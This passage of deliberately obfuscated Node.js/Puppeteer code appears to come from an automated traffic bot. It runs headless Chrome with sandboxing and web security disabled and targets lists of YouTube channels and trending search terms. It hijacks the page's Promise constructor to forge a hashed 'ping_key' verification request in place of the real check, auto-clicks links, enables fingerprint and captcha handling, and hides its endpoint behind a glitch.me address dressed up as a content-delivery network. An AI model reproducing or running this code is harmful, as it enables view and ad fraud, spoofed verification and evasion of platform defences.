                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x4be * -0x7 + -0x75c + -0x19d1 | L >>> -0xfdd + 0x1a74 * -0x1 + 0x43e * 0xa) + (M & N | ~M & O) + P + (-0x8 * -0x3ab6a4c + -0x468bb31 * -0x2 + -0x4069773 * -0xd) + Q[J] << 0x1a20 + 0x1266 + -0x2c86) << -0x614 + 0x15 * -0x2 + 0x643 | P >>> -0xac1 + -0x2 * -0x6b0 + 0x4 * -0xa1) + (L & (M = M << 0x79 * -0x1e + -0x8 * -0x258 + -0x474 | M >>> 0x959 + -0x21b + -0x1cf * 0x4) | ~L & N) + O + (-0x9f0943af + -0x67549ccf + 0xab5 * 0x20f51b) + Q[J + (-0x1 * 0x1dd4 + -0x1c51 + 0x3 * 0x1362)] << 0x156d + 0xfe * 0x1f + -0x342f) << 0x20c2 + -0x5e1 * 0x1 + -0xd6e * 0x2 | O >>> 0x533 * 0x1 + 0xc4c * -0x1 + 0x734) + (P & (L = L << 0x1cf7 * -0x1 + 0x77c + -0x13 * -0x123 | L >>> 0x3e * 0x1 + 0x6 * 0x67f + -0x2736) | ~P & M) + N + (-0x1834e9b * -0x59 + 0x32fb4adb + 0x14b06d * -0x499) + Q[J + (-0x1 * 0xda6 + 0x1 * -0xc2e + -0xceb * -0x2)] << -0x1 * 0x1da7 + -0xd71 + 0x2b18) << 0x120a + -0x322 * 0x9 + 0x209 * 0x5 | N >>> -0x1d70 + 0xd7f + -0x2 * -0x806) + (O & (P = P << 0x1 * 0x1f63 + -0x1 * 0xed2 + -0x1073 | P >>> 0x9e2 + 0x2197 + 0xe7d * -0x3) | ~O & L) + M + (0x7939e5a1 + 0x3683ed15 * -0x1 + 0x17cc810d) + Q[J + (0x18f6 + -0x1b92 + 0x29f)] << -0x6 * -0x257 + -0x1e3 * -0x1 + -0xfed) << -0xf31 + -0x2 * -0x3c9 + 0x7a4 | M >>> 0x16bf * -0x1 + -0x219 + -0x3 * -0x851) + (N & (O = O << 0xfa2 + 0x1 * -0xfe2 + 0x5e | O >>> -0x1589 + -0xa8 * 0x21 + 0x2b33) | ~N & P) + L + (0x1d * 0x1ce0d8c + -0xb23ce791 + 0xbf * 0x1220d32) + Q[J + (0x11aa + 0x9e4 * 0x2 + -0x6 * 0x63d)] << 0x12 * -0x29 + -0x10f9 + 0x13db, N = N << 0x120f + -0x15ca * -0x1 + -0x27bb | N >>> 0xfe4 + 0x4e + -0x1030;
              for (; J < 0x30b * 0x8 + 0x1 * 0x1869 + -0x3 * 0x1033; J += 0xff3 + 0x1cf7 + -0x2ce5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1c * -0x121 + 0x1e7c * 0x1 + -0x3 * 0x14b1 | L >>> 0x9a9 * -0x4 + -0x557 + 0x2c16) + (M ^ N ^ O) + P + (0x1 * 0xad046e6b + 0xa15 * -0x3e513 + -0x2e2845 * 0x7f) + Q[J] << -0x1 * -0x513 + -0x259f + 0x208c) << -0x1 * 0x3b4 + -0x4f6 + -0x1 * -0x8af | P >>> 0x224a + -0x18f2 + -0x93d) + (L ^ (M = M << -0x251 * 0x7 + 0x2705 * 0x1 + -0x58 * 0x42 | M >>> 0x19b3 + -0x10ca + 0x1 * -0x8e7) ^ N) + O + (0x3b448a3b * 0x2 + -0x7935dc5d + 0x7186b388) + Q[J + (0x23d7 + 0x96d * 0x4 + -0x498a * 0x1)] << -0x1b * -0x59 + -0x1d9 * -0x6 + -0x1479) << 0x873 + -0x117c + -0x1 * -0x90e | O >>> -0x1ebf + 0x102a + 0xeb0) + (P ^ (L = L << -0x1dd1 + 0x2 * -0xc2 + 0x1f73 | L >>> 0x4f0 + -0x67e + 0x190) ^ M) + N + (0x780b482e + -0x9fe750a4 + 0x96b5f417) + Q[J + (0x1579 + -0xf88 + 0xd9 * -0x7)] << 0xc9c + 0x24a7 + 0x3143 * -0x1) << -0xc27 * -0x1 + 0x7f5 + -0x1417 | N >>> 0x64e + -0x2 * 0x9e3 + 0x1 * 0xd93) + (O ^ (P = P << -0x2373 + 0x11b9 + -0x11d8 * -0x1 | P >>> -0x587 * -0x6 + -0x1793 + 0x995 * -0x1) ^ L) + M + (0x621ac9c5 + 0x281 * 0x1eb6f3 + 0x1 * -0x4028f497) + Q[J + (-0xa4a + 0x1c * 0x3e + -0x35 * -0x11)] << 0x1aa6 + -0x2 * -0x5b1 + -0x2608 * 0x1) << 0x239 * -0xd + 0x10bc + 0xc2e | M >>> 0x1f05 + 0x1b43 + -0x3a2d) + (N ^ (O = O << -0x248d + -0x1 * 0x7f6 + -0x2ca1 * -0x1 | O >>> -0x1210 + 0x24cd + -0x12bb) ^ P) + L + (-0x14f1 * -0xfab3 + -0x7a79f65c + -0xd4d1e37a * -0x1) + Q[J + (0x1d87 * -0x1 + -0x207f + 0x14ae * 0x3)] << 0x218d + 0x25bb * 0x1 + -0x4748, N = N << 0x1 * -0x2525 + 0x18c2 + 0x1 * 0xc81 | N >>> -0xec3 * -0x1 + -0xe4 + -0xddd;
              for (; J < -0x44 * 0x79 + 0x2417 + 0x1 * -0x3b7; J += -0x6 * 0x4b2 + 0x83b * 0x4 + -0x4bb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x13 * 0x1 + 0x4 * 0x63a + 0x1aa * -0xf | L >>> -0x2 * -0x6da + 0xe * -0x2c3 + 0x85b * 0x3) + (M & N | M & O | N & O) + P - (0x6211459 * 0x13 + 0x58bd33 * 0x153 + 0x1e44b280 * -0x4) + Q[J] << -0x161 * 0x7 + -0x1d1f + 0x26c6) << 0x3 * 0x125 + 0x734 + 0x38a * -0x3 | P >>> -0x1164 + -0x3f5 * -0x5 + -0x24a * 0x1) + (L & (M = M << 0xb5c + -0x8a0 * -0x2 + -0x1c7e | M >>> -0xa * -0x1aa + 0x6c8 + -0x176a) | L & N | M & N) + O - (-0x298bc3b6 + 0xd21facce + 0x2a * -0x1536b92) + Q[J + (-0x1c2d + 0x64a * 0x5 + -0x344)] << -0x1fff * -0x1 + 0x54f + 0x776 * -0x5) << -0x1655 + -0x1 * -0x15bf + 0x9b | O >>> 0x985 + -0x22 * 0x55 + -0x4 * -0x78) + (P & (L = L << -0x54f * -0x2 + -0x3 * -0x734 + -0x201c | L >>> -0x1 * 0x12e9 + -0x13 * 0x197 + 0x3120) | P & M | L & M) + N - (0x2376f937 + 0x4761508 * 0x2c + -0x76de5373) + Q[J + (-0x2346 + 0x47 * -0x49 + -0x5 * -0xb1b)] << 0x20c5 + 0x1437 + 0x4 * -0xd3f) << 0x4ca * -0x2 + 0x2448 + 0x3 * -0x8e5 | N >>> -0x1735 + -0x8 * 0x43f + 0x3948) + (O & (P = P << 0x23c4 + -0x91c + -0x1a8a | P >>> -0x19ae + 0x16 * -0x89 + 0x77e * 0x5) | O & L | P & L) + M - (0x653f3ec9 * -0x2 + -0x70673 * 0xfd7 + 0xb * 0x26c9a0c1) + Q[J + (-0x1b6d * 0x1 + -0x4 * -0x3fd + 0x2df * 0x4)] << -0x21 * 0xde + 0x240b * -0x1 + 0x1 * 0x40a9) << 0x1 * 0x1665 + 0x287 * -0x6 + 0x47 * -0x1a | M >>> 0x2 * 0x1b3 + -0xa65 + -0x65 * -0x12) + (N & (O = O << 0x2403 + 0xd * 0x129 + -0x32fa | O >>> -0x59 + -0x6b * 0x1 + 0xc6) | N & P | O & P) + L - (0x7548d79a + 0x58ab4e16 + -0x5d0fe28c) + Q[J + (0x1a08 + -0x163 * 0xf + 0x10b * -0x5)] << 0x1f54 + 0x1 * -0x1999 + -0x1 * 0x5bb, N = N << -0x1ec4 + -0x9 * 0x26f + 0x34c9 | N >>> 0x1ddf + -0x1afd + -0x2e0;
              for (; J < 0x166e + -0x9eb * -0x1 + -0x2009; J += -0x1d15 * 0x1 + -0x8f * 0x24 + 0x3136)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x8dd * -0x2 + 0x35e * -0xb + 0x36c9 | L >>> -0x2662 * -0x1 + -0x1e9 * 0x1 + -0x245e) + (M ^ N ^ O) + P - (0x540fd4d8 + -0x53 * 0x1ac57f + -0x15c48e81) + Q[J] << -0x1 * -0x19ed + -0xd6f + -0x3 * 0x42a) << 0x13c * -0x1 + -0xbe6 + 0xd * 0x103 | P >>> 0x14dd + -0xde * -0x29 + 0xd4 * -0x44) + (L ^ (M = M << 0x7c2 * 0x1 + 0x21e7 + -0x84f * 0x5 | M >>> 0x6e5 * -0x3 + -0x175 * 0x1 + 0x1626) ^ N) + O - (0x1 * -0x4a9e9823 + -0x11d7d52 * 0x5e + 0xe90fda69) + Q[J + (0x1264 + 0x1956 + -0x2bb9)] << 0x10b + -0x137 * -0x1 + 0x2 * -0x121) << 0x1 * 0x86f + -0x18e6 * -0x1 + -0x2150 | O >>> 0x19e3 + 0x811 + -0x21d9) + (P ^ (L = L << 0x19d4 + -0x11 * -0x1ae + -0x3644 | L >>> 0x1 * -0x24d3 + 0xf91 + 0x1544) ^ M) + N - (-0xb071d6d * 0x2 + -0x2fda7191 + 0x7b85ea95) + Q[J + (0x2c * 0x2b + -0x3 * 0x8e1 + 0x3 * 0x66b)] << -0x23c9 + -0x19a1 + 0x3d6a) << 0x184a + -0xc36 + -0xc0f | N >>> -0x1 * 0x23e9 + 0x24d1 + -0xcd) + (O ^ (P = P << 0x1bd1 * 0x1 + -0x1513 + 0x6a * -0x10 | P >>> -0x108b + 0x1d * -0x9d + 0xf * 0x24a) ^ L) + M - (-0x1e6eaa22 * 0x1 + -0x1e5f51 * -0x2a9 + 0x1 * 0x34059d3) + Q[J + (-0x1ad9 + -0x186 * -0x10 + -0x3 * -0xd4)] << -0xfa7 + 0x969 + 0x31f * 0x2) << -0x8f * 0x3c + 0x250f + -0x29 * 0x16 | M >>> -0xdb * -0x1 + 0x12d + -0x1ed) + (N ^ (O = O << 0xd3c * 0x2 + -0x85 * -0x1 + -0x1adf | O >>> -0x24f9 + 0x11bd + -0x3 * -0x66a) ^ P) + L - (-0x611a5e * 0xac + 0x5b249e4f + 0x1bb65703 * 0x1) + Q[J + (-0xdfa + -0x67a + -0x83 * -0x28)] << 0x14b1 + -0x188b + 0x11 * 0x3a, N = N << 0x1 * 0x30d + 0x1799 + -0x1a88 | N >>> 0x239e + -0x861 + 0x1 * -0x1b3b;
              this['h0'] = this['h0'] + L << -0x1 * -0x2384 + 0x18f0 * 0x1 + -0x92 * 0x6a, this['h1'] = this['h1'] + M << -0x1c7d + 0x19ed + 0x290, this['h2'] = this['h2'] + N << 0x197 + -0x71f + -0x588 * -0x1, this['h3'] = this['h3'] + O << -0xdc3 + -0x37c * 0x1 + 0x113f, this['h4'] = this['h4'] + P << -0xf0 * -0x3 + -0xe3 * 0x5 + 0x19f;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x3 * 0x35e + 0x600 + -0x436 * -0x1 & 0x1ba * -0x1 + 0x20ef + 0x376 * -0x9] + w[J >> -0x1576 + 0x1d21 * 0x1 + 0x115 * -0x7 & -0x6 * 0x21 + -0x144f + 0x1524] + w[J >> -0xf2f * 0x2 + 0x8ee + 0x1584 & -0x141e + 0x5eb + 0x5 * 0x2da] + w[J >> -0xfb6 + 0x3 * -0x3ee + 0x1b90 & 0x6f2 * -0x2 + -0x229a * -0x1 + 0x14a7 * -0x1] + w[J >> -0x8f5 + -0x1aed + 0x23ee & -0xd7 * -0x9 + -0x4ac + -0x2d4] + w[J >> 0xc3 + -0x8 * -0xb5 + -0x663 & -0x1466 + -0x62 + 0x1 * 0x14d7] + w[J >> 0xe5 + -0x2006 + 0x1f25 & -0x14d7 * 0x1 + 0x712 * 0x1 + 0xdd4] + w[-0x1 * -0x2171 + 0x288 + 0x23ea * -0x1 & J] + w[K >> 0x1023 + -0x829 * -0x4 + -0x30ab & 0x10c1 * 0x1 + 0x1ca * -0xe + 0x85a] + w[K >> 0x57d * -0x4 + 0x2c6 + 0x9a3 * 0x2 & -0x1 * 0x9d + 0xc2f + -0xb83] + w[K >> 0x25 * -0x10d + -0x9 * 0x8b + 0x2bd8 & 0x1d * 0xf5 + -0x59 * -0x1a + 0x125e * -0x2] + w[K >> -0x1a2a + -0x21fa * 0x1 + 0x3c34 & -0x1ac7 + -0x150c + -0x2a9 * -0x12] + w[K >> -0x1e82 + -0x3b * -0x1e + -0x44 * -0x59 & 0x1286 * -0x2 + 0x1f85 + -0x1a * -0x37] + w[K >> 0xd * 0xdd + -0x1e1b + 0x12ea & -0x1f31 + 0x1ede + -0x2 * -0x31] + w[K >> 0x16 * -0x9 + -0xfd7 + -0x21 * -0x81 & 0x179 + -0x6 * 0x42c + 0x179e * 0x1] + w[-0x2249 + -0x18ec + 0x3b44 & K] + w[L >> 0x1c3 * 0x2 + -0x3 * -0x7a7 + 0x1a5f * -0x1 & -0x209a + 0xc82 * 0x2 + 0x7a5] + w[L >> -0x1fd6 + 0x1d * -0x53 + 0x2955 & -0x92 * -0x4 + -0x163a + 0x6ab * 0x3] + w[L >> -0x1 * 0xf75 + -0x1 * 0xedb + -0x614 * -0x5 & 0x2346 + 0x11 * 0x101 + -0x3448] + w[L >> -0x1148 + 0x1247 * 0x1 + -0xef & 0x1 * -0x3d1 + -0x202 * 0x8 + 0x13f0] + w[L >> 0x1f88 + 0x15 * 0x3e + -0x2492 & -0x1793 + -0x1 * 0x7e1 + 0x1f83] + w[L >> -0x1066 + -0x81 * -0x1f + 0xcf & -0x63e * -0x1 + -0x1e4b + 0x181c] + w[L >> 0x513 * -0x1 + 0x22e2 + -0x1 * 0x1dcb & -0x1ddf + 0x1b1d + 0x2d1 * 0x1] + w[-0x1802 + 0xfdf + 0x2 * 0x419 & L] + w[M >> 0x29 * -0xdf + 0xe48 + 0x158b & 0x40 + -0x3de + 0x3ad] + w[M >> 0x61 * 0x7 + -0x12c0 + 0x1031 & 0x1ecb + -0x7 * -0x105 + -0x1 * 0x25df] + w[M >> 0x535 * 0x4 + 0x7f2 + -0x2 * 0xe59 & -0x266d * -0x1 + -0x128c + -0x56 * 0x3b] + w[M >> 0x170f * -0x1 + 0x9b4 + -0x479 * -0x3 & 0x67f * -0x1 + 0x9 * -0xd3 + -0x7 * -0x1ff] + w[M >> 0x20b * -0x1 + -0x633 * 0x1 + 0x2 * 0x425 & 0x1 * -0x72f + 0x5a7 * -0x4 + -0xeed * -0x2] + w[M >> -0x23 * -0x12 + -0x2 * -0x12f0 + -0x284e & -0x2165 + 0x7 * 0x1bf + 0x153b * 0x1] + w[M >> 0x1cf * 0x4 + 0x9b6 + 0x18a * -0xb & 0xd45 + 0xdf + 0x203 * -0x7] + w[0x623 * -0x2 + -0x2ff * 0x2 + -0x1 * -0x1253 & M] + w[N >> 0x263f + -0x1dbb + -0x868 & 0x22d6 + -0x146b + -0xe5c] + w[N >> 0x158 * -0xe + -0x4a3 * -0x1 + 0xe45 & 0x424 + -0xc33 + 0x81e] + w[N >> 0x3b * 0x6a + -0x2 * 0xe1d + 0x3e0 & 0x12b7 + 0x14b * 0x11 + -0x1 * 0x28a3] + w[N >> -0x43a * 0x5 + 0x6f4 + 0xe3e & 0xf * -0x262 + -0x3 * -0x35f + 0x336 * 0x8] + w[N >> 0x16f7 + 0x29a * -0xc + 0x5 * 0x1a9 & -0x578 + 0x5 * 0x72a + 0x2c1 * -0xb] + w[N >> 0x15bb * 0x1 + -0x40 * 0x50 + -0x1b3 & -0xaf * -0x2b + 0x1899 + -0x35ef] + w[N >> -0x5dd * -0x6 + -0xd9e + -0x2 * 0xac6 & -0xb * -0x53 + -0x248b + 0x2109] + w[0x56f * -0x2 + 0x8c7 + 0x226 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x19f + 0xa7 + -0x22e & -0x3b * -0x9 + 0x13c4 + -0xb8 * 0x1d,
                J >> 0x647 + -0x705 + -0x67 * -0x2 & 0x1 * -0x10a9 + 0x8a6 + -0x902 * -0x1,
                J >> -0x11b0 + 0x5 * -0x326 + 0x2176 & -0x8c * -0x2c + 0x1 * -0x502 + -0x120f,
                -0x1475 * 0x1 + 0x15f4 + -0x80 & J,
                K >> 0x1d * -0x135 + -0x25a5 + 0x245f * 0x2 & 0x3b * 0x33 + -0x86 * 0x21 + 0x684,
                K >> 0x13e4 + 0x26c9 + -0x3a9d & 0x3 * -0x3d1 + 0x1 * -0x1f6 + 0xe68,
                K >> 0x20 * 0xe7 + 0x893 + 0x5d * -0x67 & -0xd3 * 0x9 + 0x78e + -0x1 * -0xdc,
                0x108e + -0xc3 * -0xe + -0x1a39 & K,
                L >> -0x1 * 0x14b7 + -0x22bd + -0x6 * -0x942 & -0x24b1 + -0x13e * -0x18 + 0x7e0,
                L >> 0x18aa + -0x12dc + 0xd2 * -0x7 & -0xf84 + -0x1141 + 0x21c4,
                L >> -0x240f + 0x15d0 + 0xe47 & 0xfdd + -0xa35 + 0x1 * -0x4a9,
                0x1ef0 + 0xb5b + -0x2 * 0x14a6 & L,
                M >> -0x10d * -0x15 + 0x1ff9 + -0x35f2 & 0x2020 + 0x1 * -0x1e7f + 0x1 * -0xa2,
                M >> -0x1 * -0x19bc + -0x136c + -0x640 & 0x25b * 0x9 + 0x50a + -0x9 * 0x2ce,
                M >> -0x13ab + -0x1ec5 * -0x1 + 0xb12 * -0x1 & 0x1d69 + -0x1beb + -0x7f,
                0x20df * 0x1 + 0x183a + -0x381a & M,
                N >> -0x1 * -0x1d87 + 0x1f1 + 0x4 * -0x7d8 & 0x632 + 0x27 * 0xf3 + 0xc1 * -0x38,
                N >> -0x8f9 * 0x1 + -0x5 * 0x416 + 0x1d77 & 0x4 * 0x4fd + 0x15 * 0x167 + -0x3068,
                N >> 0xc6e + 0x2e * -0xa4 + 0x1112 & -0xad + -0x1 * -0x10a5 + -0x1 * 0xef9,
                -0x1ada + -0x1c10 * 0x1 + 0x44d * 0xd & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1251 + 0x56 * 0x43 + -0x1b * 0x27), (K = new DataView(J))['setUint32'](-0x492 + 0x565 * -0x3 + 0x14c1, this['h0']), K['setUint32'](0xb * -0x2ba + -0xa6 * 0x2a + 0x393e, this['h1']), K['setUint32'](0x1 * -0x66b + -0x87e * -0x4 + -0x581 * 0x5, this['h2']), K['setUint32'](-0x821 * 0x2 + -0x6c * 0x35 + 0x26aa, this['h3']), K['setUint32'](-0xb * -0x2a2 + 0x1752 + -0x3438, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me'](U(0xb, 'Nr8!') + 'nk')[-0x1dcc + 0x1a2 * -0xc + 0x3164];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x123b + -0x2d1 + 0x4 * 0x543;
            J[0x5f * 0xb + 0x4cd * 0x3 + -0x127c]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x199b + -0x7bb * -0x1 + 0x11e0] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1a64 * -0x1 + -0x9 * -0x2d0 + 0x1 * -0x33b3), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1144 + 0x26a2 + 0x29 * -0x15d;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x84b + -0x1 * -0x133 + 0xcf4), Promise['resolve'](0x11 * 0xcd + -0x18db + 0xb3f);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * 0x1a2d + 0x8c2 + -0x1 * -0x116b; j < 0xe3d + -0xc11 * -0x3 + 0x326f * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x1450 + -0x1d * -0x7d + -0x339 + (0xaff + 0x18b2 * 0x1 + -0x143 * 0x13) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1704 * 0x1 + 0x4a1 * -0x1 + 0x1ba8) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x2f * -0xa5 + -0xecc + -0xf7f; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xe99 + 0x23bf + 0x89 * -0x5e)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x19ff + -0x15e7 + -0x40e)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x23c2 + 0x10e4 + 0x12e1);

function a() {
  const bo = [
    '/Bloggerpe',
    'WQKkWOL1WQTOACkWbXC',
    'W6Lxt1xcPWSmW5NcVqi',
    'ySoIWOGnc8oqW5hcGa7cLq',
    'kCkAWP/dRCoLWRukzmoIW48',
    'W6esWPv5WRLYECk+bbK',
    'sCoLcCk1WQhdO3ziySkK',
    'e/*',
    'WONcISkTW7qmkSkjW609W48',
    'W7JdIZVdUmkXeCoGDSkfDa',
    'Ahr0Chm6lY9Tzq',
    'fgPXwCk5iSkCcCoqWRi',
    'JFcnGk0_u7',
    'BwPAt3brBeHIEa',
    'jCkWWROzzrldI1vvWOa',
    'lMWTBgLZDgvUlq',
    'DtzsvLPly045EG',
    'GET',
    'CMnLC19HBMrFBq',
    'y8o/WOfz',
    'r1DYmZnFDtbwsW',
    'mKlMouB6tp',
    'BMv3ugfNzq',
    'mo?si=cf08',
    'm34cgKSBWPCW',
    'taPJqXBI8V',
    'ttvgCJHhmg1Hoq',
    's2L0lZuZnY4ZnG',
    'W7neffBcT0nkWOBcPbq',
    'f8oOFw3cSSoDeNdcNCku',
    'W73cOmkBFCoyWRC',
    'W70HhCo7CGiXWR3dTuK',
    'FSoWWPn/pSoAW5ZcRcJdNq'
  ];
  a = function() {
    return bo;
  };
  return a();
}
